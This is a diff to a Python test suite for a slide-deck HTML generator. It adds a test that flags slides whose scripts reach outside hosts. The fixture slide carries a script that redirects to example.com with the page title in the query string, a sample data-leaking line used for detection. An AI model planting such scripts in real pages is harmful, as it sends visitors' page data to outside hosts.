@@ -89,6 +89,18 @@ def test_unknown_placeholder_key_warns(tmp_path) -> None:
             "; use one of these keys, or drop data-ph and position the element yourself" in result["warnings"])
 
 
+def test_generate_html_lists_slides_whose_script_reaches_outside(tmp_path) -> None:
+    slides = {
+        "clean": '<section data-layout="Title Only"><h1 data-ph="title">T</h1></section>',
+        "nav": ('<section data-layout="Title Only"><h1 data-ph="title">T</h1>'
+                '<script>location.href = "https://example.com/?d=" + document.title;</script></section>'),
+    }
+    deck = _deck(tmp_path, slides=slides)
+    result = api.generate_html(deck)
+    assert result["script_external"] == [{"slug": "nav", "kinds": ["navigation", "external-url"]}]
+    assert api.refresh_html(deck)["script_external"] == result["script_external"]
+
+
 def test_generate_html_custom_output_path(tmp_path) -> None:
     deck = _deck(tmp_path)
     out = tmp_path / "elsewhere" / "deck.html"
@@ -120,8 +132,9 @@ def test_deck_css_embedded_once_and_checked(tmp_path) -> None:
 def test_refresh_html_without_measure(tmp_path) -> None:
     deck = _deck(tmp_path)
     result = api.refresh_html(deck, ["slides/body.html", "slides/body.json"])
-    assert set(result) == {"html", "html_bytes", "warnings", "affected", "previews", "browser_check",
-                           "preview_files"}
+    assert set(result) == {"html", "html_bytes", "warnings", "affected", "previews", "script_external",
+                           "browser_check", "preview_files"}
+    assert result["script_external"] == []
     assert result["html"] == str(deck / "output.html")
     assert result["affected"] == ["body"]
     assert result["browser_check"]["status"] == "skipped"  # SDPM_BROWSER=none (conftest)
@@ -150,7 +163,7 @@ def test_refresh_html_with_measure_filters_warnings(tmp_path) -> None:
     (deck / "deck.css").write_text(":root { --x: 1; }", encoding="utf-8")
     result = api.refresh_html(deck, ["slides/cover.html"], measure_slides=["cover"])
     assert set(result) == {"html", "html_bytes", "warnings", "affected", "measure", "preview", "previews",
-                           "browser_check", "preview_files"}
+                           "script_external", "browser_check", "preview_files"}
     assert result["warnings"] == [w for w in result["warnings"] if w.startswith(("deck.css: ", "output.html: "))]
     # deck.css and the browser note are always reported; body / gone filtered out
     assert result["warnings"][-1] == f"output.html: {DISABLED_NOTE}" and len(result["warnings"]) == 2
